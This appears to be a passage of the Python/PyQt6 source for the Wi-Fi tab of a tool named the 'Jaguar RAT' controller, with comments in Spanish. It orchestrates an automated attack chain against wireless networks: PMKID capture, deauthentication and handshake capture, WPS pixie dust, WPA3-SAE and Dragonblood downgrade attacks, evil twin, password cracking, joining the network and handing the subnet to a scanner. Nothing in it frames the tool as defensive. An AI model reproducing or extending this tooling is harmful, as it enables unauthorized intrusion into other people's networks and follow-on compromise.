# -*- coding: utf-8 -*-
"""
============================================================================
 jaguar/ui/wifi_tab.py  —  Pestaña "📡 Wi-Fi" del controlador Jaguar RAT
============================================================================

Pestaña PERSISTENTE (no modal) que orquesta la cadena completa de extremo a
extremo:

    diagnóstico → modo monitor → escaneo de APs → ataque
    (PMKID clientless / deauth+handshake / pixie-dust / SAE)
    → crackeo (hashcat → aircrack-ng) → conexión a la red
    → puente hacia la pestaña "Escáner"

--------------------------------------------------------------------------
ARQUITECTURA (reglas duras, no negociables)
--------------------------------------------------------------------------
* Este módulo NO ejecuta binarios 802.11 por su cuenta: TODA la interacción
  con aircrack-ng / hcxdumptool / hashcat / reaver / wacker / mdk4 / hostapd
  pasa por `jaguar.common.wifi_ofensivo` (el backend). Aquí solo hay
  orquestación, hilos y widgets.
* Toda operación >200 ms corre en `threading.Thread(daemon=True)`.
* El hilo worker JAMÁS toca un widget: emite `pyqtSignal` y el slot se
  ejecuta en el hilo de la GUI. Esto es seguro porque el QObject
  `PanelWifi` vive en el hilo principal: la AutoConnection degrada a
  QueuedConnection y la entrega se hace por la cola de eventos.
  Ref: https://doc.qt.io/qt-6/threads-qobject.html
* Un `threading.Event` (`self._parar`) permite cancelar; `_matar_procesos()`
  limpia hijos zombie (airodump-ng, hcxdumptool, hashcat, reaver, ...) al
  cancelar y al cerrar la pestaña.
* Idempotencia: activar monitor dos veces o conectar dos veces no rompe.

--------------------------------------------------------------------------
VERSIONES MÍNIMAS DE LOS BINARIOS EXTERNOS
--------------------------------------------------------------------------
  aircrack-ng   >= 1.6      airmon-ng, airodump-ng, aireplay-ng, aircrack-ng
                            (modo monitor, deauth, captura, crackeo CPU)
  hcxtools      >= 6.0.0    hcxdumptool, hcxpcapngtool  (PMKID clientless,
                            conversión a hashcat -m 22000)
  hashcat       >= 6.2.6    modo 22000 (WPA-PBKDF2-PMKID+EAPOL)
  reaver        >= 1.6.5    WPS + pixiewps (`-K 1`)
  bully         >= 0.7      alternativa a reaver para WPS
  wacker        >= 1.0      ataque WPA3-SAE (blunderbuss-wctf/wacker)
  DragonShift   >= 0.2      downgrade WPA3 transition-mode (Dragonblood)
  mdk4          >= 4.2      deauth masivo (modo a) y FragAttacks (modo f)
  hostapd       >= 2.9      evil twin
  dnsmasq       >= 2.80     DHCP/DNS del evil twin
  wpa_supplicant>= 2.9      conexión a la red
  dhclient      >= 4.4      DHCP cliente (fallback: nmcli / udhcpc)
  nmcli (NM)    >= 1.30     alternativa de conexión en escritorios Linux

--------------------------------------------------------------------------
LIMITACIONES CONOCIDAS
--------------------------------------------------------------------------
 1. Adaptador sin soporte de monitor o de inyección → se degrada a escaneo
    pasivo con `iwlist`/`nmcli` y se avisa en claro (no se falla).
 2. Banda 6 GHz: requiere adaptador 802.11ax + kernel >= 5.10 y regulación
    correcta. Si el adaptador no la soporta, el filtro simplemente no
    devuelve APs.
 3. WPA3 puro (SAE): no hay PMKID ni 4-way handshake clásico → directo a
    `wacker`. Transición WPA2/WPA3 → se trata como WPA2.
 4. PMKID no disponible (AP sin PMKID caching, típico en APs antiguos) →
    fallback obligatorio a deauth + captura de handshake.
 5. WSL2: sin `airmon-ng` nativo; hay que pasar el USB con `usbipd-win`
    (https://github.com/dorssel/usbipd-win) y traducir rutas /mnt/c/... .
 6. Sin root: algunas operaciones (monitor, deauth, conexión) fallarán;
    el diagnóstico lo avisa explícitamente.
 7. Sin GPU o si `hashcat` falla → fallback automático a `aircrack-ng -w`.
 8. NetworkManager pelea con la tarjeta → `airmon-ng check kill` /
    `nmcli device set <if> managed no` antes de monitorizar y
    `restaurar_red()` al terminar.
 9. Rutas con espacios → siempre citadas en los comandos de shell.
10. `pkill -f` puede tumbar el wpa_supplicant del sistema; NetworkManager
    lo relanza solo. Es el precio de no dejar zombies.

Autor: equipo Jaguar. Comentarios y docstrings en español, como el resto.
============================================================================
"""

from __future__ import annotations

import os
import shutil
import subprocess
import threading
from datetime import datetime

from PyQt6.QtCore import Qt, QTimer, pyqtSignal
from PyQt6.QtGui import QBrush, QColor, QFont
from PyQt6.QtWidgets import (
    QAbstractItemView,
    QCheckBox,
    QComboBox,
    QFileDialog,
    QGridLayout,
    QGroupBox,
    QHBoxLayout,
    QHeaderView,
    QInputDialog,
    QLabel,
    QLineEdit,
    QMessageBox,
    QPlainTextEdit,
    QProgressBar,
    QPushButton,
    QSizePolicy,
    QSpinBox,
    QSplitter,
    QTableWidget,
    QTableWidgetItem,
    QVBoxLayout,
    QWidget,
)

__all__ = ["PanelWifi"]

# ---------------------------------------------------------------------------
# Backend Wi-Fi. Si el módulo no importa, la pestaña se degrada con aviso en
# lugar de reventar el arranque de la aplicación completa.
# ---------------------------------------------------------------------------
try:
    from jaguar.common import wifi_ofensivo as wof
except Exception as _e_w:  # pragma: no cover - depende del entorno
    wof = None
    _ERR_WOF = str(_e_w)
else:
    _ERR_WOF = ""

try:
    from jaguar.common import escaner as _escaner
except Exception:  # pragma: no cover
    _escaner = None

# Estilo de botón del tema global (con fallback local si el tema cambia).
try:
    from jaguar.ui.theme import ESTILO_BOTON as _ESTILO_BOTON
except Exception:  # pragma: no cover
    _ESTILO_BOTON = ""

# ---------------------------------------------------------------------------
# Paleta local (rojo/negro). No se llama a aplicar_tema_rojo_negro() desde
# aquí porque el tema lo aplica MainWindow sobre la QApplication.
# ---------------------------------------------------------------------------
C_FONDO = "#0d0d0d"
C_PANEL = "#151515"
C_BORDE = "#3a0d0d"
C_ROJO = "#d81f1f"
C_ROJO_CLARO = "#ff4d4d"
C_TEXTO = "#e8e8e8"
C_GRIS = "#8d8d8d"
C_VERDE = "#38d67f"
C_AMBAR = "#ffb020"
C_AZUL = "#5fa8ff"

# Colores por clasificación de seguridad del AP.
_COLOR_SEGURIDAD = {
    "abierta": C_GRIS,
    "WEP": C_AMBAR,
    "WPA2": "#c8e06a",
    "WPA2-WPA3": C_VERDE,
    "WPA3-SAE": C_ROJO_CLARO,
    "WPA3-OWE": C_AZUL,
    "desconocida": C_TEXTO,
}

# Columnas de la tabla de APs (RF4).
_COLS_AP = ["ESSID", "BSSID", "Canal", "Señal (dBm)", "Seguridad",
            "WPS", "Banda", "Recomendado"]

# Binarios que se matan al cancelar / cerrar (evita zombies).
_BINS_A_MATAR = (
    "airodump-ng", "aireplay-ng", "airmon-ng", "hcxdumptool",
    "hcxpcapngtool", "hashcat", "reaver", "bully", "wash", "wacker",
    "DragonShift", "dragonshift", "mdk4", "hostapd", "dnsmasq",
    "wpa_supplicant", "dhclient",
)

# Paquete apt asociado a cada binario (para el comando de instalación).
_PAQUETE = {
    "aircrack-ng": "aircrack-ng", "airmon-ng": "aircrack-ng",
    "airodump-ng": "aircrack-ng", "aireplay-ng": "aircrack-ng",
    "hcxdumptool": "hcxtools", "hcxpcapngtool": "hcxtools",
    "hashcat": "hashcat", "reaver": "reaver", "wash": "reaver",
    "bully": "bully", "mdk4": "mdk4", "wacker": "wacker",
    "hostapd": "hostapd", "dnsmasq": "dnsmasq",
    "wpa_supplicant": "wpasupplicant", "dhclient": "isc-dhcp-client",
    "nmcli": "network-manager",
}

# Reglas de hashcat ofrecidas (RF6).
_REGLAS = [
    ("Sin reglas", ""),
    ("best64", "best64.rule"),
    ("rockyou-30000", "rockyou-30000.rule"),
    ("dive", "dive.rule"),
    ("OneRuleToRuleThemAll", "OneRuleToRuleThemAll.rule"),
]


def _es_root() -> bool:
    """True si el proceso corre como root (Linux/macOS). En Windows: False."""
    try:
        return os.geteuid() == 0  # type: ignore[attr-defined]
    except AttributeError:
        return False


def _q(ruta: str) -> str:
    """Cita una ruta para shell, tolerando espacios (caso límite 11)."""
    if not ruta:
        return '""'
    if ruta.startswith('"') or ruta.startswith("'"):
        return ruta
    return '"%s"' % ruta.replace('"', '\\"')


class PanelWifi(QWidget):
    """Pestaña Wi-Fi completa: diagnóstico, monitor, escaneo, ataque,
    crackeo, conexión y puente hacia la pestaña Escáner.

    Señales públicas:
        subred_lista(str)  → subred detectada, para que MainWindow rellene
                             el campo objetivo del tab Escáner.
    """

    # --- Señales (todas entregadas en el hilo de la GUI) -------------------
    subred_lista = pyqtSignal(str)

    _sig_log = pyqtSignal(str)
    _sig_diag = pyqtSignal(str)
    _sig_aps = pyqtSignal(list)
    _sig_ifaces = pyqtSignal(list)
    _sig_words = pyqtSignal(list)
    _sig_wps = pyqtSignal(list)
    _sig_progreso = pyqtSignal(int, str)
    _sig_resultado = pyqtSignal(str, str)
    _sig_fin = pyqtSignal(str, bool, str)

    # ------------------------------------------------------------------ init
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setObjectName("PanelWifi")

        # --- Estado (solo lo lee el hilo GUI; el worker recibe copias) ----
        self._aps: list = []
        self._objetivo: dict | None = None
        self._psk: str = ""
        self._iface_actual: str = ""
        self._mon_actual: str | None = None
        self._modo_solo_escucha: bool = False
        self._ocupado: bool = False
        self._clave_activa: str = ""
        self._parar = threading.Event()
        self._hilo: threading.Thread | None = None
        self._ultima_captura: str = ""

        # Callback de log para el backend. Se emite como señal porque lo
        # invoca el hilo worker.
        self._log_cb = lambda m: self._sig_log.emit(str(m))

        self._build_ui()
        self._conectar_senales()
        self._refrescar_botones()

        # Carga diferida: deja pintar la ventana antes de tocar el sistema.
        QTimer.singleShot(150, self.refrescar_todo)

    # =====================================================================
    # CONSTRUCCIÓN DE LA UI
    # =====================================================================
    def _build_ui(self) -> None:
        raiz = QVBoxLayout(self)
        raiz.setContentsMargins(8, 8, 8, 8)
        raiz.setSpacing(6)

        # ---- 1. Diagnóstico (RF2) ---------------------------------------
        g_diag = QGroupBox("🩺 Diagnóstico del entorno")
        lay_d = QVBoxLayout(g_diag)
        self.lbl_diag = QLabel("Diagnosticando…")
        self.lbl_diag.setTextFormat(Qt.TextFormat.RichText)
        self.lbl_diag.setWordWrap(True)
        self.lbl_diag.setTextInteractionFlags(
            Qt.TextInteractionFlag.TextSelectableByMouse)
        self.lbl_diag.setStyleSheet(
            "QLabel{background:%s;border:1px solid %s;border-radius:4px;"
            "padding:6px;color:%s;}" % (C_PANEL, C_BORDE, C_TEXTO))
        lay_d.addWidget(self.lbl_diag)
        fila_d = QHBoxLayout()
        self.btn_rediagnostico = QPushButton("🔄 Re-diagnosticar")
        self.btn_rediagnostico.setToolTip(
            "Vuelve a comprobar backend y herramientas disponibles.")
        self.btn_rediagnostico.clicked.connect(self.refrescar_todo)
        self.btn_copiar_cmd = QPushButton("📋 Copiar comando de instalación")
        self.btn_copiar_cmd.clicked.connect(self._copiar_comando_instalacion)
        fila_d.addWidget(self.btn_rediagnostico)
        fila_d.addWidget(self.btn_copiar_cmd)
        fila_d.addStretch(1)
        lay_d.addLayout(fila_d)
        raiz.addWidget(g_diag)

        # ---- 2. Interfaz + monitor (RF3) --------------------------------
        fila_sup = QHBoxLayout()

        g_if = QGroupBox("📶 Interfaz y modo monitor")
        lay_if = QGridLayout(g_if)
        self.cmb_iface = QComboBox()
        self.cmb_iface.setMinimumWidth(160)
        self.cmb_iface.currentTextChanged.connect(self._on_iface_cambiada)
        self.btn_refrescar_if = QPushButton("🔄")
        self.btn_refrescar_if.setToolTip("Refrescar lista de interfaces")
        self.btn_refrescar_if.clicked.connect(self._refrescar_ifaces)
        self.btn_monitor_on = QPushButton("🛰 Activar monitor")
        self.btn_monitor_on.setToolTip(
            "airmon-ng start <iface>. Requiere root y adaptador compatible.")
        self.btn_monitor_on.clicked.connect(self._op_monitor_on)
        self.btn_monitor_off = QPushButton("🌐 Restaurar red")
        self.btn_monitor_off.setToolTip(
            "Detiene el modo monitor y devuelve la tarjeta a NetworkManager.")
        self.btn_monitor_off.clicked.connect(self._op_monitor_off)
        self.lbl_monitor = QLabel("Monitor: —")
        self.lbl_monitor.setStyleSheet("color:%s;" % C_GRIS)
        lay_if.addWidget(QLabel("Interfaz:"), 0, 0)
        lay_if.addWidget(self.cmb_iface, 0, 1)
        lay_if.addWidget(self.btn_refrescar_if, 0, 2)
        lay_if.addWidget(self.btn_monitor_on, 1, 0, 1, 2)
        lay_if.addWidget(self.btn_monitor_off, 1, 2)
        lay_if.addWidget(self.lbl_monitor, 2, 0, 1, 3)

        g_scan = QGroupBox("🔎 Escaneo de redes")
        lay_sc = QGridLayout(g_scan)
        self.sp_segundos = QSpinBox()
        self.sp_segundos.setRange(5, 600)
        self.sp_segundos.setValue(20)
        self.sp_segundos.setSuffix(" s")
        self.cmb_banda = QComboBox()
        for txt, val in (("Todas", None), ("2.4 GHz", "2.4"),
                         ("5 GHz", "5"), ("6 GHz", "6")):
            self.cmb_banda.addItem(txt, val)
        self.btn_escanear = QPushButton("🔎 Escanear APs")
        self.btn_escanear.setToolTip(
            "airodump-ng sobre la interfaz en monitor (o escaneo pasivo si "
            "no hay monitor).")
        self.btn_escanear.clicked.connect(self._op_escanear)
        self.btn_cancelar = QPushButton("⏹ Cancelar")
        self.btn_cancelar.setToolTip(
            "Solicita parada y mata los procesos hijos.")
        self.btn_cancelar.clicked.connect(self._op_cancelar)
        lay_sc.addWidget(QLabel("Duración:"), 0, 0)
        lay_sc.addWidget(self.sp_segundos, 0, 1)
        lay_sc.addWidget(QLabel("Banda:"), 0, 2)
        lay_sc.addWidget(self.cmb_banda, 0, 3)
        lay_sc.addWidget(self.btn_escanear, 1, 0, 1, 2)
        lay_sc.addWidget(self.btn_cancelar, 1, 2, 1, 2)

        fila_sup.addWidget(g_if, 1)
        fila_sup.addWidget(g_scan, 1)
        raiz.addLayout(fila_sup)

        # ---- 3. Tabla de APs (RF4) --------------------------------------
        self.tabla = QTableWidget(0, len(_COLS_AP))
        self.tabla.setHorizontalHeaderLabels(_COLS_AP)
        self.tabla.setSelectionBehavior(
            QAbstractItemView.SelectionBehavior.SelectRows)
        self.tabla.setSelectionMode(
            QAbstractItemView.SelectionMode.SingleSelection)
        self.tabla.setEditTriggers(
            QAbstractItemView.EditTrigger.NoEditTriggers)
        self.tabla.setAlternatingRowColors(True)
        self.tabla.setSortingEnabled(True)
        self.tabla.verticalHeader().setVisible(False)
        hh = self.tabla.horizontalHeader()
        hh.setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        for c in range(1, len(_COLS_AP)):
            hh.setSectionResizeMode(c, QHeaderView.ResizeMode.ResizeToContents)
        self.tabla.itemDoubleClicked.connect(
            lambda *_: self._marcar_objetivo())
        self.tabla.itemSelectionChanged.connect(self._refrescar_botones)

        # ---- 4. Ataque / crackeo (RF5, RF6) -----------------------------
        g_atk = QGroupBox("⚔ Ataque y crackeo")
        lay_atk = QGridLayout(g_atk)
        self.lbl_objetivo = QLabel("Objetivo: <i>ninguno</i>")
        self.lbl_objetivo.setTextFormat(Qt.TextFormat.RichText)
        self.btn_objetivo = QPushButton("🎯 Marcar objetivo")
        self.btn_objetivo.setToolTip("O doble clic sobre la fila del AP.")
        self.btn_objetivo.clicked.connect(self._marcar_objetivo)
        self.btn_atacar = QPushButton("⚔ Atacar AP (auto)")
        self.btn_atacar.setToolTip(
            "Cadena automática: PMKID clientless → deauth+handshake → "
            "pixie dust (WPS) → wacker (SAE).")
        self.btn_atacar.clicked.connect(self._op_atacar)

        self.cmb_wordlist = QComboBox()
        self.cmb_wordlist.setMinimumWidth(180)
        self.btn_wordlist_otra = QPushButton("📁 Otra…")
        self.btn_wordlist_otra.setToolTip("Elegir un diccionario manualmente.")
        self.btn_wordlist_otra.clicked.connect(self._elegir_wordlist)

        self.cmb_reglas = QComboBox()
        for txt, val in _REGLAS:
            self.cmb_reglas.addItem(txt, val)

        self.sp_pmkid = QSpinBox()
        self.sp_pmkid.setRange(5, 300)
        self.sp_pmkid.setValue(25)
        self.sp_pmkid.setSuffix(" s")
        self.sp_pmkid.setToolTip("Tiempo de intento PMKID antes del fallback.")

        self.btn_crack_captura = QPushButton("🔓 Crackear captura…")
        self.btn_crack_captura.setToolTip(
            "Selecciona .pcapng/.cap/.22000; convierte con hcxpcapngtool y "
            "crackea (hashcat → fallback aircrack-ng).")
        self.btn_crack_captura.clicked.connect(self._op_crackear_captura)

        lay_atk.addWidget(self.lbl_objetivo, 0, 0, 1, 4)
        lay_atk.addWidget(self.btn_objetivo, 1, 0)
        lay_atk.addWidget(self.btn_atacar, 1, 1)
        lay_atk.addWidget(QLabel("PMKID:"), 1, 2)
        lay_atk.addWidget(self.sp_pmkid, 1, 3)
        lay_atk.addWidget(QLabel("Diccionario:"), 2, 0)
        lay_atk.addWidget(self.cmb_wordlist, 2, 1, 1, 2)
        lay_atk.addWidget(self.btn_wordlist_otra, 2, 3)
        lay_atk.addWidget(QLabel("Reglas:"), 3, 0)
        lay_atk.addWidget(self.cmb_reglas, 3, 1, 1, 2)
        lay_atk.addWidget(self.btn_crack_captura, 3, 3)

        # ---- 5. Conexión + puente (RF7, RF8) ----------------------------
        g_con = QGroupBox("🔌 Conexión y puente al Escáner")
        lay_con = QGridLayout(g_con)
        self.txt_ssid = QLineEdit()
        self.txt_ssid.setPlaceholderText("SSID objetivo")
        self.txt_psk = QLineEdit()
        self.txt_psk.setPlaceholderText("PSK (se rellena al crackear)")
        self.btn_conectar = QPushButton("🔌 Conectar a esta red")
        self.btn_conectar.setToolTip(
            "wpa_supplicant + DHCP, y verifica que hay IP real.")
        self.btn_conectar.clicked.connect(self._op_conectar)
        self.btn_subred = QPushButton("➡ Enviar subred al Escáner")
        self.btn_subred.setToolTip(
            "Detecta la subred de la interfaz y la manda al tab Escáner.")
        self.btn_subred.clicked.connect(lambda: self.enviar_subred())
        self.chk_lanzar = QCheckBox("Lanzar escaneo al enviar")
        self.txt_subred = QLineEdit()
        self.txt_subred.setReadOnly(True)
        self.txt_subred.setPlaceholderText("subred detectada…")
        lay_con.addWidget(QLabel("SSID:"), 0, 0)
        lay_con.addWidget(self.txt_ssid, 0, 1, 1, 3)
        lay_con.addWidget(QLabel("PSK:"), 1, 0)
        lay_con.addWidget(self.txt_psk, 1, 1, 1, 3)
        lay_con.addWidget(self.btn_conectar, 2, 0, 1, 2)
        lay_con.addWidget(self.btn_subred, 2, 2, 1, 2)
        lay_con.addWidget(self.chk_lanzar, 3, 0, 1, 2)
        lay_con.addWidget(self.txt_subred, 3, 2, 1, 2)

        # ---- 6. Avanzado (WPS, deauth, evil twin, SAE) ------------------
        g_av = QGroupBox("🧰 Avanzado")
        lay_av = QGridLayout(g_av)
        self.btn_wps_scan = QPushButton("🔑 Escanear WPS")
        self.btn_wps_scan.clicked.connect(self._op_wps_escanear)
        self.btn_wps_atk = QPushButton("✨ Pixie dust")
        self.btn_wps_atk.setToolTip("reaver -K 1 / bully sobre el objetivo.")
        self.btn_wps_atk.clicked.connect(self._op_wps_atacar)
        self.btn_deauth = QPushButton("📣 Deauth (mdk4)")
        self.btn_deauth.setToolTip("mdk4 modo 'a' contra el AP objetivo.")
        self.btn_deauth.clicked.connect(self._op_deauth)
        self.btn_evil = QPushButton("👥 Evil twin")
        self.btn_evil.setToolTip("hostapd + dnsmasq con el SSID objetivo.")
        self.btn_evil.clicked.connect(self._op_evil_twin)
        self.btn_wacker = QPushButton("🅦 WPA3 (wacker)")
        self.btn_wacker.setToolTip("Ataque SAE con diccionario.")
        self.btn_wacker.clicked.connect(self._op_wacker)
        self.btn_dragonshift = QPushButton("🐉 DragonShift")
        self.btn_dragonshift.setToolTip(
            "Downgrade WPA3 transition-mode (Dragonblood).")
        self.btn_dragonshift.clicked.connect(self._op_dragonshift)
        for i, b in enumerate((self.btn_wps_scan, self.btn_wps_atk,
                               self.btn_deauth, self.btn_evil,
                               self.btn_wacker, self.btn_dragonshift)):
            lay_av.addWidget(b, i // 3, i % 3)

        fila_bot = QHBoxLayout()
        fila_bot.addWidget(g_atk, 2)
        fila_bot.addWidget(g_con, 2)
        fila_bot.addWidget(g_av, 1)

        # ---- 7. Tabla + log en un splitter ------------------------------
        split = QSplitter(Qt.Orientation.Vertical)
        cont_tabla = QWidget()
        lay_t = QVBoxLayout(cont_tabla)
        lay_t.setContentsMargins(0, 0, 0, 0)
        lay_t.addWidget(self.tabla)
        split.addWidget(cont_tabla)

        g_log = QGroupBox("📜 Log de ejecución")
        lay_log = QVBoxLayout(g_log)
        self.txt_log = QPlainTextEdit()
        self.txt_log.setReadOnly(True)
        self.txt_log.setMaximumBlockCount(5000)
        f = QFont("Monospace")
        f.setStyleHint(QFont.StyleHint.TypeWriter)
        self.txt_log.setFont(f)
        self.txt_log.setStyleSheet(
            "QPlainTextEdit{background:#0a0a0a;color:#d8d8d8;"
            "border:1px solid %s;}" % C_BORDE)
        self.btn_limpiar_log = QPushButton("🧹 Limpiar log")
        self.btn_limpiar_log.clicked.connect(self.txt_log.clear)
        lay_log.addWidget(self.txt_log)
        lay_log.addWidget(self.btn_limpiar_log)
        split.addWidget(g_log)
        split.setStretchFactor(0, 3)
        split.setStretchFactor(1, 2)

        raiz.addLayout(fila_bot)
        raiz.addWidget(split, 1)

        # ---- 8. Barra de progreso ---------------------------------------
        self.progreso = QProgressBar()
        self.progreso.setRange(0, 100)
        self.progreso.setValue(0)
        self.progreso.setTextVisible(True)
        raiz.addWidget(self.progreso)

        # Estilo local coherente con el tema rojo/negro.
        for w in self.findChildren(QPushButton):
            if _ESTILO_BOTON:
                w.setStyleSheet(_ESTILO_BOTON)
            else:
                w.setStyleSheet(
                    "QPushButton{background:#1a0505;color:%s;"
                    "border:1px solid %s;border-radius:4px;padding:5px 10px;}"
                    "QPushButton:hover{background:%s;color:#fff;}"
                    "QPushButton:disabled{background:#111;color:#555;"
                    "border-color:#222;}" % (C_TEXTO, C_ROJO, C_ROJO))
        self.setStyleSheet(
            self.styleSheet()
            + "QGroupBox{border:1px solid %s;border-radius:5px;"
              "margin-top:10px;padding-top:8px;color:%s;}"
              "QGroupBox::title{subcontrol-origin:margin;left:10px;"
              "padding:0 4px;color:%s;}" % (C_BORDE, C_TEXTO, C_ROJO_CLARO))

    def _conectar_senales(self) -> None:
        """Conecta las señales internas a sus slots (hilo GUI)."""
        self._sig_log.connect(self._on_log)
        self._sig_diag.connect(self.lbl_diag.setText)
        self._sig_aps.connect(self._on_aps)
        self._sig_ifaces.connect(self._on_ifaces)
        self._sig_words.connect(self._on_words)
        self._sig_wps.connect(self._on_wps)
        self._sig_progreso.connect(self._on_progreso)
        self._sig_resultado.connect(self._on_resultado)
        self._sig_fin.connect(self._on_fin)

    # =====================================================================
    # INFRAESTRUCTURA DE HILOS
    # =====================================================================
    def _lanzar(self, clave: str, fn, *args, **kwargs) -> bool:
        """Ejecuta `fn` en un hilo daemon. Devuelve False si ya hay una
        operación en curso (idempotencia: no se apilan tareas)."""
        if self._ocupado:
            self._log("⏳ Ocupado con '%s'; espera o pulsa Cancelar."
                      % self._clave_activa)
            return False
        self._clave_activa = clave
        self._ocupado = True
        self._parar.clear()
        self.progreso.setRange(0, 0)  # indeterminado
        self._refrescar_botones()

        def _runner():
            ok, msg = True, "OK"
            try:
                fn(*args, **kwargs)
            except Exception as exc:  # nunca dejar el hilo sin reportar
                import traceback
                ok, msg = False, str(exc)
                self._sig_log.emit(
                    "✖ [%s] %s\n%s" % (clave, exc,
                                       traceback.format_exc(limit=4)))
            finally:
                self._sig_fin.emit(clave, ok, msg)

        self._hilo = threading.Thread(
            target=_runner, name="jaguar-wifi-%s" % clave, daemon=True)
        self._hilo.start()
        return True

    def _on_fin(self, clave: str, ok: bool, msg: str) -> None:
        """Restaura el estado tras terminar un worker (hilo GUI)."""
        self._ocupado = False
        self._clave_activa = ""
        self.progreso.setRange(0, 100)
        self.progreso.setValue(100 if ok else 0)
        if not ok and msg:
            self._log("✖ Tarea '%s' terminada con error: %s" % (clave, msg))
        self._refrescar_botones()

    def _op_cancelar(self) -> None:
        """Pide parada y mata hijos (caso límite 10)."""
        if not self._ocupado:
            self._log("ℹ Nada en ejecución.")
            return
        self._log("⏹ Cancelación solicitada para '%s'…" % self._clave_activa)
        self._parar.set()
        self._matar_procesos()

    def _matar_procesos(self) -> None:
        """Mata binarios 802.11 huérfanos. Nunca lanza excepción."""
        # 1) Si el backend expone su propia limpieza, se usa.
        if wof is not None:
            for nombre in ("limpiar_procesos", "matar_todo", "limpiar"):
                fn = getattr(wof, nombre, None)
                if callable(fn):
                    try:
                        fn()
                        return
                    except Exception:
                        pass
        # 2) Fallback genérico.
        try:
            if os.name == "nt":
                for b in _BINS_A_MATAR:
                    subprocess.run(["taskkill", "/IM", b + ".exe", "/F"],
                                   capture_output=True, check=False)
            else:
                for b in _BINS_A_MATAR:
                    if shutil.which(b):
                        subprocess.run(["pkill", "-f", b],
                                       capture_output=True, check=False)
        except Exception as exc:
            self._log("⚠ Limpieza de procesos: %s" % exc)

    def detener(self) -> None:
        """Llamado por MainWindow al cerrar la app (la pestaña no tiene
        closeEvent propio)."""
        try:
            self._parar.set()
            self._matar_procesos()
        except Exception:
            pass

    # =====================================================================
    # SLOTS DE SEÑALES
    # =====================================================================
    def _on_log(self, texto: str) -> None:
        ts = datetime.now().strftime("%H:%M:%S")
        self.txt_log.appendPlainText("[%s] %s" % (ts, texto.rstrip()))

    def _log(self, texto: str) -> None:
        """Atajo para log desde el hilo GUI."""
        self._on_log(texto)

    def _on_progreso(self, pct: int, txt: str) -> None:
        if pct <= 0:
            self.progreso.setRange(0, 0)
        else:
            self.progreso.setRange(0, 100)
            self.progreso.setValue(min(100, pct))
        if txt:
            self.progreso.setFormat("%s  (%p%)" % txt)

    def _on_resultado(self, clave: str, texto: str) -> None:
        """Resultados con carga semántica (se ejecuta en el hilo GUI)."""
        if clave == "psk":
            self._psk = texto
            self.txt_psk.setText(texto)
            self._log("🔑 PSK encontrada: %s" % texto)
            QMessageBox.information(self, "PSK encontrada",
                                    "Contraseña de la red:\n\n%s" % texto)
        elif clave == "sinpsk":
            self._log("⚠ %s" % texto)
        elif clave == "subred":
            self._ultima_subred = texto
            self.txt_subred.setText(texto)
            self._log("➡ Subred lista para el Escáner: %s" % texto)
            self.subred_lista.emit(texto)
        elif clave == "subred_fail":
            self._log("⚠ No se pudo determinar la subred de la interfaz.")
        elif clave == "monitor":
            self.lbl_monitor.setText(texto)
            self.lbl_monitor.setStyleSheet("color:%s;" % C_VERDE)
            self._log("🛰 %s" % texto)
        elif clave == "monitor_fail":
            self.lbl_monitor.setText(texto)
            self.lbl_monitor.setStyleSheet("color:%s;" % C_AMBAR)
            self._log("⚠ %s" % texto)
        elif clave == "ip":
            self._log("✅ %s" % texto)
        else:
            self._log(str(texto))

    # =====================================================================
    # DIAGNÓSTICO (RF2)
    # =====================================================================
    def refrescar_todo(self) -> None:
        """Lanza en un solo worker diagnóstico + interfaces + diccionarios."""
        if wof is None:
            self.lbl_diag.setText(
                "<b style='color:%s'>Backend wifi_ofensivo NO importable:</b> "
                "%s" % (C_ROJO_CLARO, _ERR_WOF or "desconocido"))
            self._log("✖ No se puede usar la cadena Wi-Fi: %s" % _ERR_WOF)
            return
        self._lanzar("inicio", self._tarea_inicio)

    def _tarea_inicio(self) -> None:
        self._tarea_diagnostico()
        self._tarea_ifaces()
        self._tarea_words()

    def _tarea_diagnostico(self) -> None:
        """Compone el panel de diagnóstico. Todo defensivo."""
        partes: list[str] = []

        try:
            bk = wof.backend()
        except Exception as exc:
            bk = "desconocido (%s)" % exc
        color_bk = {"linux": C_VERDE, "wsl": C_AMBAR,
                    "windows": C_AMBAR}.get(bk, C_GRIS)
        partes.append("<b>Backend detectado:</b> "
                      "<span style='color:%s'>%s</span>" % (color_bk, bk))
        if bk == "wsl":
            partes.append(
                "<span style='color:%s'>⚠ WSL2: no hay airmon-ng nativo. "
                "Pasa el adaptador USB con usbipd-win "
                "(https://github.com/dorssel/usbipd-win) y usa rutas "
                "/mnt/c/... traducidas.</span>" % C_AMBAR)

        try:
            partes.append(wof.resumen_herramientas())
        except Exception as exc:
            partes.append("⚠ resumen_herramientas(): %s" % exc)

        faltan: list = []
        try:
            faltan = list(wof.faltantes() or [])
        except Exception:
            faltan = []
        try:
            esenciales = list(wof.esenciales_faltan() or [])
        except Exception:
            esenciales = []

        if esenciales:
            partes.append("<b style='color:%s'>Faltan binarios ESENCIALES: "
                          "%s</b>" % (C_ROJO_CLARO, ", ".join(esenciales)))
        elif faltan:
            partes.append("<span style='color:%s'>Opcionales ausentes: %s "
                          "(la cadena funciona con degradación).</span>"
                          % (C_AMBAR, ", ".join(faltan)))
        else:
            partes.append("<span style='color:%s'>✔ Stack completo.</span>"
                          % C_VERDE)

        cmd = self._comando_instalacion(faltan or esenciales)
        if cmd:
            partes.append("<b>Instalar:</b> <code>%s</code>" % cmd)

        if not _es_root() and os.name != "nt":
            partes.append(
                "<span style='color:%s'>⚠ No se corre como root: el modo "
                "monitor, el deauth y la conexión pueden fallar. Prueba con "
                "<code>sudo python run.py</code>.</span>" % C_AMBAR)
        if bk == "windows":
            partes.append(
                "<span style='color:%s'>ℹ En Windows nativo el stack "
                "aircrack/hcxtools es limitado; se recomienda WSL2 + "
                "usbipd-win.</span>" % C_GRIS)

        try:
            diag = wof.diagnostico()
            if diag:
                partes.append("<pre style='white-space:pre-wrap'>%s</pre>"
                              % diag)
        except Exception:
            pass

        self._sig_diag.emit("<br>".join(partes))

    def _comando_instalacion(self, faltantes: list) -> str:
        """Construye el comando apt para lo que falta (sin duplicados)."""
        if not faltantes:
            return ""
        pkgs = []
        for b in faltantes:
            p = _PAQUETE.get(b)
            if p and p not in pkgs:
                pkgs.append(p)
        if not pkgs:
            return ""
        return "sudo apt update && sudo apt install -y %s" % " ".join(pkgs)

    def _copiar_comando_instalacion(self) -> None:
        """Copia al portapapeles el comando de instalación."""
        try:
            faltan = list(wof.faltantes() or []) if wof else []
            esenciales = list(wof.esenciales_faltan() or []) if wof else []
        except Exception:
            faltan, esenciales = [], []
